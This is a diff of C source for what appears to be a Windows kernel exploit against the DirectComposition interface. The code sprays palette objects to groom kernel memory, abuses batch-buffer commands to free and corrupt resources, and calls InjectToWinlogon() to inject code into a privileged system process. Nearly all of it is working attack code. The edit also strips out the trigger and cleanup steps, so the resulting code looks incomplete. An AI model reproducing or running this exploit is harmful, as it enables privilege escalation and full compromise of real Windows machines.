@@ -604,57 +604,15 @@ int main(int argc, TCHAR* argv[]) {
     *(DWORD*)((PUCHAR)pMappedAddress + 8) = 8;
     ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x8, &dwArg1, &dwArg2);
 
+    for (size_t i = 0; i < 0x5000; i++)
+    {
+        createPaletteofSize1(g_pExploitCtx->ObjectSize);
+    }
+
     DWORD out1;
     DWORD out2;
     BOOL in1 = FALSE;
 
     NtDCompositionCommitChannel(hChannel, &out1, &out2, in1, NULL);
-    for (size_t i = 0; i < 0x5000; i++)
-    {
-        createPaletteofSize1(g_pExploitCtx->ObjectSize);
-
-        *(DWORD*)pMappedAddress = nCmdReleaseResource;
-        *(HANDLE*)((PUCHAR)pMappedAddress + 4) = (HANDLE)3;
-        *(DWORD*)((PUCHAR)pMappedAddress + 8) = 8;
-        ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x8, &dwArg1, &dwArg2);
-
-        if (ntStatus != 0)
-        {
-            printf("error!\n");
-            return 0;
-        }
-        for (size_t i = 0; i < 0x5000; i++)
-        {
-            createPaletteofSize2(g_pExploitCtx->ObjectSize);
-        }
-
-        szBuff[0] = 0x04;
-        szBuff[1] = 0x04;
-        szBuff[2] = 0xffff;
-
-        *(DWORD*)pMappedAddress = nCmdSetResourceBufferProperty;
-        *(HANDLE*)((PUCHAR)pMappedAddress + 4) = (HANDLE)(1);
-        *(DWORD*)((PUCHAR)pMappedAddress + 8) = 0;
-        *(DWORD*)((PUCHAR)pMappedAddress + 0xc) = 12;
-        CopyMemory((PUCHAR)pMappedAddress + 0x10, szBuff, 12);
-        ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10 + 12, &dwArg1, &dwArg2);
-        if (ntStatus != 0)
-        {
-            printf("error!\n");
-            return 0;
-        }
-
-        InjectToWinlogon();
-        RestoreStatus();
-        *(DWORD*)pMappedAddress = nCmdReleaseResource;
-        *(HANDLE*)((PUCHAR)pMappedAddress + 4) = (HANDLE)1;
-        *(DWORD*)((PUCHAR)pMappedAddress + 8) = 8;
-        ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x8, &dwArg1, &dwArg2);
-
-        *(DWORD*)pMappedAddress = nCmdReleaseResource;
-        *(HANDLE*)((PUCHAR)pMappedAddress + 4) = (HANDLE)4;
-        *(DWORD*)((PUCHAR)pMappedAddress + 8) = 8;
-        ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x8, &dwArg1, &dwArg2);
-        return 0;
-    }
+    InjectToWinlogon();
 }
